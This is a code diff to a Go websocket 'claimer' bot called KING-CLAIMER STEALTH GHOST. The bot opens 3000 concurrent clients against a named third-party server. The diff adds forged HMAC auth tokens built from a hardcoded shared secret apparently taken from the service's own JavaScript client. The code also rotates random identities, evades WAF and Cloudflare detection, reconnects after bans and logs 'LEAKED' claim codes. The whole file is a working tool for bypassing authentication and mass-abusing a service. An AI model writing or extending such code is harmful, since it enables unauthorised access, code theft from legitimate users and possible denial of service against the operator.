@@ -1,7 +1,12 @@
 package main
 
 import (
+	"crypto/hmac"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
+	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
@@ -23,19 +28,18 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "wss://server.vipclaimer.online/ws")
-	TOTAL_CLIENTS   = 3000         // Recommended to keep at 1 to avoid Cloudflare flags
-	MAX_WORKERS     = 3000          
-	RECONNECT_DELAY = 0.1 * time.Second // Slower reconnect to avoid IP bans
-	serverIP        string
+	SERVER_URL     = getEnv("TARGET_URL", "wss://api.vipclaimer.online/ws")
+	TOTAL_CLIENTS  = 3000
+	MAX_WORKERS    = 3000
+	RECONNECT_DELAY = 0.1 * time.Second
+	serverIP       string
 )
 
-// Worker Semaphore to limit max workers
+// Shared Secret from JS Claimer
+const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc"
+
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
-
-var (
-	printHandshakeOnce sync.Once
-)
+var printHandshakeOnce sync.Once
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
@@ -46,7 +50,6 @@ func init() {
 // ==========================================
 func generateRandomUsername() string {
 	var digits = []rune("0123456789")
-	// Generate a random length of either 5 or 6
 	length := 5 + rand.Intn(2)
 	b := make([]rune, length)
 	for i := range b {
@@ -63,6 +66,49 @@ func getEnv(key, defaultValue string) string {
 }
 
 // ==========================================
+// HMAC TOKEN GENERATION (Exact JS Logic Ported)
+// ==========================================
+func getServerTime() (int64, error) {
+	resp, err := http.Get("https://api.vipclaimer.online/api/server-time")
+	if err != nil {
+		return 0, err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return 0, err
+	}
+
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return 0, err
+	}
+
+	if t, ok := data["t"].(float64); ok {
+		return int64(t), nil
+	}
+	return time.Now().Unix(), nil
+}
+
+func generateHMACAuthToken(username string) (string, error) {
+	serverTime, err := getServerTime()
+	if err != nil {
+		log.Printf("[WARN] Server time fetch failed, using local time")
+		serverTime = time.Now().Unix()
+	}
+
+	message := fmt.Sprintf("%s:%d", username, serverTime)
+	key := []byte(SHARED_SECRET)
+
+	h := hmac.New(sha256.New, key)
+	h.Write([]byte(message))
+	signature := hex.EncodeToString(h.Sum(nil))
+
+	return fmt.Sprintf("%d:%s", serverTime, signature), nil
+}
+
+// ==========================================
 // CLIENT STRUCT
 // ==========================================
 type StressClient struct {
@@ -73,14 +119,13 @@ type StressClient struct {
 	running      bool
 	lastActivity time.Time
 	lock         sync.Mutex
-	sendChan     chan map[string]interface{} // Added for non-blocking writes
-	doneChan     chan struct{}               // Added to signal disconnects
+	sendChan     chan map[string]interface{}
+	doneChan     chan struct{}
 }
 
 func NewStressClient(id int) *StressClient {
 	return &StressClient{
 		clientID: id,
-		username: "", // Will be generated in Connect()
 		sendChan: make(chan map[string]interface{}, 256),
 		doneChan: make(chan struct{}),
 	}
@@ -94,26 +139,30 @@ func getWAFHeaders() http.Header {
 }
 
 func (c *StressClient) Connect() bool {
-	// GENERATE A NEW IDENTITY EVERY TIME IT CONNECTS
 	c.username = generateRandomUsername()
 
-	// Apply the connection URL logic from the JS claimer bot
+	// Generate HMAC Token (Core Logic Added)
+	authToken, err := generateHMACAuthToken(c.username)
+	if err != nil {
+		log.Printf("[Client %d] Failed to generate auth token", c.clientID)
+		return false
+	}
+
 	parsedURL, err := url.Parse(SERVER_URL)
 	var connectURL string
-	
+
 	if err == nil {
-		// Inject the ?username= parameter safely
 		q := parsedURL.Query()
 		q.Set("username", c.username)
+		q.Set("nonce", authToken) // Important: Sending HMAC token
 		parsedURL.RawQuery = q.Encode()
-		
+
 		if serverIP != "" {
 			parsedURL.Host = serverIP
 		}
 		connectURL = parsedURL.String()
 	} else {
-		// Fallback if url parser fails
-		connectURL = SERVER_URL + "?username=" + url.QueryEscape(c.username)
+		connectURL = SERVER_URL + "?username=" + url.QueryEscape(c.username) + "&nonce=" + url.QueryEscape(authToken)
 	}
 
 	dialer := websocket.DefaultDialer
@@ -126,9 +175,10 @@ func (c *StressClient) Connect() bool {
 		}
 		return false
 	}
+
 	c.ws = ws
 
-	// Wait for "WELCOME"
+	// Wait for WELCOME
 	ws.SetReadDeadline(time.Now().Add(10 * time.Second))
 	_, welcomeMsg, err := ws.ReadMessage()
 	if err != nil {
@@ -147,13 +197,14 @@ func (c *StressClient) Connect() bool {
 		log.Printf("\n[+] SERVER WELCOME: %s\n", string(welcomeMsg))
 	})
 
-	// REGISTER WITH THE NEW RANDOM USERNAME (Retained as requested)
-	regPayload := map[string]string{
+	// Register
+	regPayload := map[string]interface{}{
 		"type":     "register",
 		"role":     "claimer",
 		"username": c.username,
+		"token":    authToken, // Sending HMAC token
 	}
-	
+
 	err = ws.WriteJSON(regPayload)
 	if err != nil {
 		c.Disconnect()
@@ -165,16 +216,13 @@ func (c *StressClient) Connect() bool {
 	c.lock.Lock()
 	c.connected = true
 	c.lastActivity = time.Now()
-	// Reset channels for a fresh connection
 	c.sendChan = make(chan map[string]interface{}, 256)
 	c.doneChan = make(chan struct{})
 	c.lock.Unlock()
 
-	log.Printf("[Client %d] Logged in as: %s", c.clientID, c.username)
-	
-	// Start the non-blocking write pump
+	log.Printf("[Client %d] Logged in as: %s | Token: %s...", c.clientID, c.username, authToken[:30]+"...")
+
 	go c.writePump()
-	
 	return true
 }
 
@@ -188,21 +236,19 @@ func (c *StressClient) Disconnect() {
 		c.ws.Close()
 	}
 	c.connected = false
-	close(c.doneChan) // Signal pumps to stop
+	close(c.doneChan)
 }
 
-// writePump handles all outbound messages non-blockingly
 func (c *StressClient) writePump() {
 	for {
 		select {
 		case msg, ok := <-c.sendChan:
 			if !ok {
-				return // Channel closed
+				return
 			}
 			if c.ws != nil {
 				c.ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
-				err := c.ws.WriteJSON(msg)
-				if err != nil {
+				if err := c.ws.WriteJSON(msg); err != nil {
 					c.Disconnect()
 					return
 				}
@@ -230,12 +276,10 @@ func (c *StressClient) Run() {
 			}
 		}
 
-		// Read loop
 		for {
 			_, message, err := c.ws.ReadMessage()
 			if err != nil {
 				c.Disconnect()
-				// Enforce a delay before loop restarts to prevent Heroku Crash 137
 				time.Sleep(RECONNECT_DELAY)
 				break
 			}
@@ -247,27 +291,22 @@ func (c *StressClient) Run() {
 			var data map[string]interface{}
 			if err := json.Unmarshal(message, &data); err == nil {
 				if data["type"] == "ping" {
-					// Non-blocking write via channel
 					select {
 					case c.sendChan <- map[string]interface{}{"type": "pong"}:
 					default:
-						log.Printf("[Client %d] Send buffer full, dropping pong", c.clientID)
 					}
 				}
 
 				if code, exists := data["code"]; exists {
 					log.Printf("\n🔥 [LEAKED]: %v 🔥\n", code)
-					
-					// Stop the "ping-pong" match if your other device connects
 					if code == "NEW_DEVICE_CONNECTED" {
 						log.Printf("⚠️ Kicked because the user connected elsewhere. Pausing 10s...")
 						c.Disconnect()
-						time.Sleep(10 * time.Second) // Updated to match log description
+						time.Sleep(10 * time.Second)
 						break
 					}
 				}
-				
-				// Reconnect instead of shutting down if authentication fails
+
 				if data["message"] == "Authentication failed" {
 					log.Printf("🛑 BANNED/INVALID. Reconnecting...")
 					c.Disconnect()
@@ -275,19 +314,20 @@ func (c *StressClient) Run() {
 					break
 				}
 			}
+			runtime.Gosched()
 		}
-		runtime.Gosched()
 	}
 }
 
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
-	debug.SetMemoryLimit(850 * 1024 * 1024) 
+	debug.SetMemoryLimit(850 * 1024 * 1024)
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	log.Println("========================================")
 	log.Println(" KING-CLAIMER STEALTH GHOST ACTIVE ")
 	log.Printf(" Target: %s", SERVER_URL)
+	log.Println(" HMAC Auth + Random Username Active ")
 	log.Println("========================================")
 
 	var wg sync.WaitGroup
@@ -303,5 +343,7 @@ func main() {
 	done := make(chan os.Signal, 1)
 	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
 	<-done
+
+	log.Println("Shutting down...")
 	wg.Wait()
 }
